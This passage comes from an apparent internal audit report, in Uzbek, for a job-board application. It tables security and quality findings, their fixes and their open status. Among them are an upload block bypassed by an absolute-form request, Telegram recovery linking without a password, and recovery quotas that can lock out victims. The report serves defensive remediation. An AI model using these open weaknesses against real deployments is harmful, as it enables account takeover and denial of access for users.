- **Root cause:** Mehmon/seeker/employer 401/403 sikli faqat /api/admin/articles, /api/admin/team va /api/admin/articles/authors ni qamraydi. admin.routes endpointlari faqat admin tokeni bilan chaqiriladi. Rol o'zgarishi, broadcast, moderatsiya, sharh o'chirish va kompaniya tasdig'i admin bo'lmagan yoki content_editor tokenlari bilan hech qachon sinalmaydi.
- **Impact:** requireStaff('admin') ni kengroq guard'ga almashtirgan regressiya CI'dan o'tib ketadi.
- **Evidence:** e2e-check.mjs:930-937 path ro'yxati uchta admin articles/team yo'li bilan cheklangan.
- **Recommended fix:** Siklni admin.routes GET va PATCH/POST yo'llariga kengaytiring: seeker, employer, content_editor, content_author tokenlari 403, mehmon 401.
- **Severity izohi:** P3 saqlandi; ISSUE-063 PARTIAL.
- **Manba topilmalar:** admin-staff-15
- **Bajarilgan fix:** admin-staff-15: FIXED — e2e-check.mjs "[admin-staff-15] admin mutatsiyalari" asserts guest 401 and job_seeker/employer 403 for 12 admin mutations (users block/role, vacancies moderate, companies verify, r
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)
## ROUND 3 — PHASE 6: ikkinchi to'liq audit

- 10 ta o'qish-rejimidagi finder (auth/tiklash, IDOR, API-web shartnomasi, UI holatlari, DB/10K, xavfsizlik sarlavhalari, SEO/i18n, a11y/responsive, ma'lumot yaxlitligi, hujjat/testlar) fix'lardan keyingi kodni fix'lardan oldingi snapshot bilan solishtirdi.
- 157 ta xom topilma → 128 ta noyob muammo; P0/P1 lar adversarial verify'dan o'tdi (bitta lens). Xom natija: `docs/audit/raw/round3-second-audit.json`.

| Ko'rsatkich | Soni |
|---|---:|
| Noyob muammolar | 128 |
| P0 / P1 / P2 / P3 | 0 / 7 / 32 / 89 |
| Round 3 o'zgarishlari keltirib chiqargan | 88 |
| Verify: CONFIRMED / PARTIAL / UNVERIFIED | 5 / 2 / 121 |

### P1 va P2 (to'liq ro'yxat, yakuniy holat bilan)

| UID | Sev (verify) | R3 sabab | Holat | Fayl | Muammo | Izoh |
|---|---|---|---|---|---|---|
| backend-1 | P1 (CONFIRMED) | ha | FIXED | `apps/api/src/modules/auth/recovery.routes.ts:124` | Parol tiklash, admin qo'lda tiklashni tasdiqlashi, telefon almashtirish va Telegram'ni uzish foydalanuvchining boshqa ochiq challenge'lari va berilgan | `revokeUserSessions` endi barcha ochiq challenge va berilgan reset tokenlarini bekor qiladi (reset, qo'lda tiklash, telefon almashtirish, bloklash, rol, logout); Telegram uzilganda ham. Test: auth-check `[R3-2]`. |
| backend-2 | P1 → P2 (PARTIAL) | ha | FIXED | `apps/api/src/modules/vacancies/vacancies.routes.ts:475` | Ish beruvchi rad etilgan yoki moderatsiyadagi e'lonni yopganda qulf holati izchil saqlanmaydi: eski e'lonlarda moderatsiya chetlab o'tiladi, yangilari | Ish beruvchi rad etilgan yoki moderatsiyadagi e'lonni yopsa ham qulf (`adminArchivedAt`) qo'yiladi. Alohida e2e qo'shilmadi. |
| backend-3 | P1 (CONFIRMED) | yo'q | FIXED | `apps/web/src/lib/api.ts:346` | D-074 yarim bajarilgan: asosiy SSR fetch'lari x-ssr-key yubormaydi, bosh sahifa, vakansiya va kompaniya sahifalari hanuz IP bo'yicha 600/min bucket'ig | Barcha SSR fetch'lari `ssrHeaders()` bilan `x-ssr-key` yuboradi (vakansiya/kompaniya ro'yxati, detail, similar, facets). |
| backend-4 | P1 → P2 (PARTIAL) | ha | PARTIAL | `apps/web/src/pages/+headersResponse.ts:52` | Web CSP dagi object-src 'none' blob: orqali ochilgan PDF rezyumeni Chrome/Edge PDF ko'ruvchisida bloklashi mumkin (D-057 va D-058 bir-biriga zid) | CSP `object-src` `'none'` → `blob:` (faqat sayt skripti yaratadigan blob). Headless Chromium'da PDF ko'ruvchi yo'q — haqiqiy brauzerda tekshirilmadi. |
| backend-5 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/src/modules/telegram/telegram.routes.ts:39` | POST /api/telegram/link parol so'ramaydi: o'g'irlangan seans telefoni tasdiqlanmagan hisobga o'z Telegram tiklash kanalini bog'lab, parolni tiklaydi v | Birinchi Telegram bog'lash parol talab qilmaydi. Parol majburiy qilinsa Google orqali yaratilgan (parolini bilmaydigan) hisoblar telefonni tasdiqlay olmaydi — mahsulot qarori kerak. Tavsiya: birinchi bog'lashdan keyin 24 soat davomida shu kanal orqali tiklashni cheklash. |
| backend-6 | P2 (UNVERIFIED) | yo'q | OPEN | `apps/api/src/modules/profile/profile.routes.ts:126` | Profil PATCH'idagi telefon yozuvi avval tekshirib, keyin shartsiz yozadi (check-then-write): bot tasdiqlagan zahoti begona raqam 'tasdiqlangan' bo'lib | Tuzatilmadi — ochiq; tavsiya etilgan fix: Yozuvni shartli qiling: `prisma.user.updateMany({ where: { id: userId, isPhoneVerified: false }, data: { phone: normalized } })`. count === 0 bo'lsa 409 USE_PHONE_CHANGE qaytaring. Bot tomonidagi tasdiq yozuvi raqamni is |
| backend-7 | P2 (UNVERIFIED) | yo'q | OPEN | `apps/api/src/modules/admin/admin.routes.ts:614` | Admin sharhni o'chirsa unique slot bo'shaydi va muallif qayta yuborgan sharh darhol 'approved' bo'ladi (D-075 da'vosiga zid) | Tuzatilmadi — ochiq; tavsiya etilgan fix: Admin o'chirishini soft-delete qiling: status `rejected` va comment'ni tozalash, yoki additiv `deletedByAdminAt` maydoni. Shunda @@unique([companyId, userId]) slot band qoladi va qayta yuborish update yo'li orqali `pendi |
| backend-8 | P2 (UNVERIFIED) | yo'q | OPEN | `apps/api/src/modules/vacancies/vacancies.routes.ts:477` | Admin vakansiya holati o'tishlari bitta qoidaga bo'ysunmaydi: PATCH /api/vacancies/:id/status qoralama va bloklangan egasining e'lonini chop etadi, mo | Tuzatilmadi — ochiq; tavsiya etilgan fix: Admin o'tishlarini bitta yordamchiga ko'chiring, masalan `assertAdminTransition(vacancy, target)`: draft'ga istalgan moderatsiya amali → 409 VACANCY_IS_DRAFT; active faqat moderation, rejected yoki adminArchivedAt o'rnat |
| backend-9 | P2 (UNVERIFIED) | yo'q | OPEN | `apps/api/src/modules/admin/admin.routes.ts:89` | Rol o'zgarganda moderatsiyadagi e'lonlar arxivlanmaydi va admin ularni ish beruvchi bo'lmagan hisob nomidan chop eta oladi | Tuzatilmadi — ochiq; tavsiya etilgan fix: archiveOwnerVacancies'da `status: { in: ["active", "moderation"] }` holatidagi e'lonlarni (adminArchivedAt bilan) arxivlang. Moderate va PATCH /status faollashtirishida `owner.role === "employer"` ekanini tekshiring, aks |
| backend-10 | P2 (UNVERIFIED) | yo'q | FIXED | `apps/api/src/server.ts:194` | /uploads/*.pdf blokini absolute-form so'rov (GET http://host/uploads/resume-<hex>.pdf) chetlab o'tadi | Absolute-form so'rov (`GET http://host/uploads/x.pdf`) pathname'ga normallashtiriladi. |
| backend-11 | P2 (UNVERIFIED) | ha | FIXED | `apps/web/src/lib/auth/session.ts:182` | Web: /api/auth/phone/* chaqiruvlari eskirgan React tokeni bilan yuboriladi, interceptor esa /api/auth/ yo'llarini chetlab o'tadi — telefon almashtiris | frontend-docs-1 bilan bir xil. |
| backend-12 | P2 (UNVERIFIED) | ha | FIXED | `apps/web/src/components/PhoneGateNotice.tsx:80` | Rule K: telefon gate'i bot ishlamaganda 503 TELEGRAM_UNAVAILABLE qaytaradi, lekin ariza, sharh, xabar va vakansiya e'loni Rule K xabarini ko'rsatmaydi | `isPhoneGateError` `TELEGRAM_UNAVAILABLE` ni ham gate deb biladi — Rule K xabari ko'rsatiladi. |
| backend-13 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/src/modules/auth/recovery.routes.ts:62` | Raqam va email bo'yicha tiklash kvotalari bitta manbaga qurbonning barcha tiklash yo'llarini doimiy bloklash imkonini beradi | Tiklash kvotalari (raqam/email bo'yicha) qurbonning tiklash yo'lini vaqtincha bloklashi mumkin. Tavsiya: login-guard kabi raqam+IP kaliti va yuqoriroq raqam chegarasi. |
| backend-14 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/src/modules/candidates/candidates.routes.ts:99` | Nomzodlar qidiruvi har so'rovda 20 000 tagacha chop etilgan rezyume va 5 000 tagacha bloklangan hisobni o'qib, ulkan $in/$notIn quradi | Tuzatilmadi — ochiq; tavsiya etilgan fix: Sahifalashni bazaga qaytaring: JobSeekerProfile'ga denormalizatsiyalangan `hasPublishedResume Boolean` (rezyume yozilganda yangilanadi) va `@@index([hasPublishedResume, isOpenToWork, userId])` qo'shing, `id: { in: [...]  |
| backend-15 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/src/common/cache.ts:36` | Kesh bo'limlari (bumpDataVersion scope) amalda ishlamaydi: 16 chaqiruvdan 15 tasi hamon barcha keshlarni tozalaydi, izohlar esa aksini da'vo qiladi | Tuzatilmadi — ochiq; tavsiya etilgan fix: Chaqiruvchilarni bo'limga o'tkazing: reviews.routes.ts → `bumpDataVersion("reviews", "companies")`; companies.routes.ts va auth.service.ts:76 → `bumpDataVersion("companies")`; vacancies.routes.ts va admin.routes.ts dagi  |
| backend-16 | P2 (UNVERIFIED) | yo'q | OPEN | `apps/api/src/modules/chat/chat.routes.ts:612` | /api/conversations kursor sahifalashi xotirada bajariladi: har so'rovda foydalanuvchining BARCHA suhbatlari va ularning oxirgi xabarlari o'qiladi | Tuzatilmadi — ochiq; tavsiya etilgan fix: Conversation'ga additiv `lastMessageAt DateTime?`, `lastMessagePreview String?`, `lastSenderId String?` va `@@index([employerUserId, lastMessageAt])`, `@@index([seekerUserId, lastMessageAt])` qo'shing. deliverMessage ula |
| backend-17 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/src/common/cache.ts:75` | keyedCache LRU emas, FIFO: turli qidiruv so'rovlari bosh sahifa facets va katalog keshini siqib chiqaradi (alohida filtrsiz slot olib tashlangan) | Tuzatilmadi — ochiq; tavsiya etilgan fix: Hit bo'lganda yozuvni `entries.delete(key); entries.set(key, hit)` bilan oxiriga ko'chiring (LRU). Filtrsiz facets va katalog birinchi sahifasi uchun alohida, chiqarib bo'lmaydigan `cached()` slotini qaytaring yoki keyed |
| backend-18 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/prisma/schema.prisma:474` | Yangi @@index([status, isPremium, salaryMin, id]) salary_asc saralashini qoplamaydi (saralash yo'nalishlari aralash) | Tuzatilmadi — ochiq; tavsiya etilgan fix: salary_asc uchun yo'nalishli indeks qo'shing: `@@index([status, isPremium(sort: Desc), salaryMin, id(sort: Desc)])`. Mavjud indeks salary_desc'ni qoplashda davom etadi. Yoki listBySalary saralashini bitta yo'nalishga kel |
| backend-19 | P2 (UNVERIFIED) | ha | FIXED | `apps/api/src/modules/applications/applications.routes.ts:505` | Ish beruvchi arizalari server sahifalashini qoplaydigan indeks yo'q: Application'ga Round 3 da bitta ham indeks qo'shilmagan | Application `@@index([vacancyId, createdAt])` qo'shildi. |
| backend-20 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/src/modules/vacancies/vacancies.service.ts:250` | Vakansiya matn qidiruvida kompaniya va soha nomlari cheksiz o'qiladi, apostrof variantlari esa regex sonini 7 barobar oshiradi | Tuzatilmadi — ochiq; tavsiya etilgan fix: company.findMany va vacancyCategory.findMany'ga `take: RELATION_MATCH_LIMIT` qo'shing (admin.routes.ts:69 dagidek 1000). Tutuq belgisi variantlarini so'rov vaqtida ko'paytirish o'rniga yozishda normallashtirilgan maydonn |
| frontend-docs-1 | P1 (CONFIRMED) | ha | FIXED | `apps/web/src/lib/auth/session.ts:182` | Telefon xavfsizligi amallari (/api/auth/phone/*) eskirgan access token bilan yuboriladi: kirishdan ~15 daqiqa o'tgach har safar 401 | Fetch interceptor faqat seans endpointlarini chetlab o'tadi; `/api/auth/phone/*` endi yangilangan token bilan ketadi. |
| frontend-docs-2 | P1 (CONFIRMED) | ha | FIXED | `apps/api/src/modules/telegram/telegram.service.ts:836` | Redeploy'dan keyin Telegram boti butunlay to'xtashi mumkin: 409 endi fatal, shutdown'dagi getUpdates 'ack' esa yangi nusxaga 409 beradi | Telegram 409 (redeploy paytida ikki nusxa) endi vaqtinchalik: oshib boruvchi kutish bilan qayta urinish; 401 fatal qoladi. |
| frontend-docs-3 | P1 (CONFIRMED) | ha | FIXED | `apps/web/src/lib/messages/useMessenger.ts:578` | Havola bilan ochilgan va birinchi sahifada bo'lmagan suhbat avto-sahifalashda topilgach ham tarixi yuklanmaydi: panel abadiy skeletda, composer o'chiq | Messenger: faol suhbat ro'yxatda paydo bo'lganda tarix yuklanadi (effekt `activeInList` ga bog'landi). |
| frontend-docs-4 | P2 (UNVERIFIED) | ha | OPEN | `apps/web/src/lib/useChatSocket.ts:141` | Telefon tasdiqlanmagan yoki limitga tushgan yuboruvchi WS xato kadrini ko'rmaydi: xabar 10 s dan keyin sababsiz 'Yuborilmadi' bo'ladi va ulanish har s | Tuzatilmadi — ochiq; tavsiya etilgan fix: useChatSocket'ga onError(code, clientId) ishlovchisini qo'shing. useMessenger shu clientId bo'yicha taymerni to'xtatsin, pufakni sababi bilan darhol 'failed' qilsin va reset() chaqirmasin. PHONE_NOT_VERIFIED yoki TELEGRA |
| frontend-docs-5 | P2 (UNVERIFIED) | ha | FIXED | `apps/web/src/components/PhoneGateNotice.tsx:79` | Rule K: requirePhoneVerified qaytaradigan 503 TELEGRAM_UNAVAILABLE ariza, vakansiya formasi, sharh va kompaniyaga yozishda umumiy xato bo'lib ko'rinad | backend-12 bilan bir xil. |
| frontend-docs-6 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/src/common/realtime.ts:86` | Logout revokeUserSessions → closeUserSockets standart qiymatlari bilan ketadi: barcha push obunalari jim o'chadi (web 'yoqilgan' deb ko'rsataveradi) v | Logout = barcha qurilmalardan chiqish (D-054), shuning uchun push obunalari ham o'chadi — xatti-harakat kutilgan, lekin UI'da aytilmaydi. |
| frontend-docs-7 | P2 (UNVERIFIED) | ha | FIXED | `apps/web/src/lib/api.ts:346` | D-074 web qismi yarim bajarilgan: vakansiya va kompaniya SSR fetcherlari x-ssr-key yubormaydi, 429 esa endi sahifani 503 qiladi | backend-3 bilan bir xil. |
| frontend-docs-8 | P2 (UNVERIFIED) | ha | OPEN | `apps/web/src/pages/login/+Page.tsx:71` | i18n-3 yarim bajarilgan: t.errors.codes hech qayerda ishlatilmaydi, login, signup, Google va nomzodlar kvotasi ru/en da xom o'zbekcha server matnini k | Tuzatilmadi — ochiq; tavsiya etilgan fix: Login, signup, SocialLogin, nomzodlar kvota kartasi va EmployerApplicationsView'da `apiErrorText(err, locale, { fallback, network: t.errors.network, byCode: t.errors.codes })` ishlating va "Xatolik" bilan qilingan sentin |
| frontend-docs-9 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/src/modules/applications/applications.routes.ts:233` | Ish beruvchi arizalari: matn qidiruvi butun bazadan 5000 ta moslik bilan kesiladi, vakansiya (2000) va arizachi (10000) chegaralari ham belgisiz, nati | D-082: matn qidiruvi chegaralari (5000 moslik) hujjatlashtirilgan; keng so'rov ~3.1 s. |
| frontend-docs-10 | P2 (UNVERIFIED) | ha | OPEN | `apps/web/src/components/HeadDefault.tsx:34` | hreflang va x-default query parametrlarini tashlaydi: canonical, sitemap va hreflang bir-biriga zid | Tuzatilmadi — ochiq; tavsiya etilgan fix: hreflang va x-default'ni canonical bilan bir xil whitelist parametrlardan quring. Buning uchun sahifa +Head'lari alternates'ni o'zi chiqarsin va HeadDefault ularni o'tkazib yuborsin, yoki umumiy canonicalParams(pageConte |
| frontend-docs-11 | P2 (UNVERIFIED) | yo'q | OPEN | `apps/web/src/components/TelegramConnect.tsx:86` | Telefonni tasdiqlash deep-linki await'dan keyin window.open bilan ochiladi: popup bloklansa havola UI'da hech qayerda ko'rinmaydi | Tuzatilmadi — ochiq; tavsiya etilgan fix: Olingan havolani state'ga saqlang va PhoneSecurity yoki LinkCard'dagi kabi `<a href target="_blank" rel="noopener">` 'Telegram'ni ochish' tugmasi va amal qilish muddati bilan ko'rsating. window.open faqat qo'shimcha urin |
| frontend-docs-12 | P2 (UNVERIFIED) | ha | OPEN | `apps/web/src/components/Select.tsx:190` | Custom Select va LanguageSwitcher'da klaviatura bilan tanlangan faol variant deyarli ko'rinmaydi (kontrast ~1.1:1) | Tuzatilmadi — ochiq; tavsiya etilgan fix: Faol variantga kamida 3:1 kontrastli indikator bering: masalan `ring-2 ring-inset ring-[rgb(var(--focus))]`, chap tomonda 3px --focus chizig'i yoki bg-signal fon + oq matn. Select va LanguageSwitcher'da bir xil naqsh ish |
| frontend-docs-13 | P2 (UNVERIFIED) | ha | OPEN | `apps/web/src/components/messages/MessageList.tsx:162` | Chat: 'Eskiroq xabarlar' yuklanganda role=log jonli hududi 50 tagacha eski xabarni ketma-ket o'qib beradi | Tuzatilmadi — ochiq; tavsiya etilgan fix: Eski xabarlar yuklanayotganda va prepend'dan keyingi kadrgacha aria-live="off" qiling, yoki eski sahifani log'dan tashqaridagi alohida ro'yxatga chizing. Natijani bitta qisqa sr-only status bilan e'lon qiling ('N ta eski |
| frontend-docs-14 | P2 (UNVERIFIED) | yo'q | OPEN | `apps/web/src/components/employer/vacancies/ConfirmDialog.tsx:55` | ConfirmDialog, RatingDialog va jamoa profili dialogida max-height va ichki scroll yo'q: past ekranda tasdiqlash tugmalariga yetib bo'lmaydi | Tuzatilmadi — ochiq; tavsiya etilgan fix: Uchala panelga `max-h-[calc(100dvh-2rem)] overflow-y-auto overscroll-contain` qo'shing, yoki umumiy DialogPanel komponentini ajratib, tanani scroll qiladigan va footer'i sticky bo'lgan qiling. 740x360 va 360x640 o'lchaml |
| frontend-docs-15 | P2 (UNVERIFIED) | ha | FIXED | `README.md:281` | README va DEPLOY test:auth uchun noto'g'ri o'zgaruvchini (E2E_DATABASE_URL) va ildizda mavjud bo'lmagan buyruqni ko'rsatadi | README/DEPLOY: `AUTH_TEST_DATABASE_URL` va to'g'ri buyruq. |
| frontend-docs-16 | P2 (UNVERIFIED) | ha | FIXED | `docs/audit/FINAL_AUDIT.md:140` | docs/audit/FINAL_AUDIT.md Round 3 dan oldingi holatda qolgan va koddagi Round 3 natijalariga zid; ISSUES.md jadvalida bir ID uchun zid holatlar bor | FINAL_AUDIT.md ga Round 3 yakuniy hisobot qo'shildi. |
| frontend-docs-17 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/scripts/auth-telegram-check.mjs:1315` | Auth harness soxta yashil natija beradi: log gigienasi tekshiruvi (Rule L) bot yo'lini qamramaydi, identity yagonaligi testlari esa kontakt bosqichiga | Tuzatilmadi — ochiq; tavsiya etilgan fix: Test jarayonida bot logger'ini ushlang (startTelegramBot'ga logger bering yoki console.log/warn ni vaqtincha o'rang) va bu matnni ham secrets bo'yicha skanerlang. Server jarayoni uchun test rejimida chiquvchi xabarlarni  |
| frontend-docs-18 | P2 (UNVERIFIED) | ha | OPEN | `apps/api/scripts/auth-telegram-check.mjs:1373` | Round 3 ning ko'p shartnomalari uchun umuman test yo'q: yangi rate limit va kvotalar, web CSP, D-062 himoyalari, reset yon ta'sirlari | Tuzatilmadi — ochiq; tavsiya etilgan fix: auth-telegram-check'ga bitta IP (ip opsiyasi) bilan N+1 so'rov yuborib 429 ni kutadigan kvota tekshiruvlarini qo'shing, har biri alohida hisob yoki raqam bilan. D-062 uchun NODE_ENV=production + TELEGRAM_TEST_MODE=1 hola |
| frontend-docs-19 | P2 (UNVERIFIED) | yo'q | FIXED | `DEPLOY.md:151` | DEPLOY.md production bazaga demo seed'ni tavsiya qiladi: ochiq parolli hisoblar va haqiqiy brend nomidagi 'tasdiqlangan' kompaniyalar yaratiladi | DEPLOY.md: demo seed production'da ishga tushirilmasligi haqida ogohlantirish. |

| Yakuniy holat (P1+P2) | Soni |
|---|---:|
| FIXED | 15 |
| OPEN | 23 |
| PARTIAL | 1 |

### P3 (89 ta)

P3 lar (polish, hujjat noaniqliklari, kichik UX) bu raundda tuzatilmadi va tekshirilmadi; to'liq ro'yxat xom JSON'da. Asosiy mavzular:

- web: 25
- a11y: 13
- db-scale : 7
- seo: 6
- docs: 4
- admin : 3
- auth : 3
- api: 3
- responsive: 3
- i18n : 2
- i18n: 2
- moderatsiya qulfi (D-070): 1

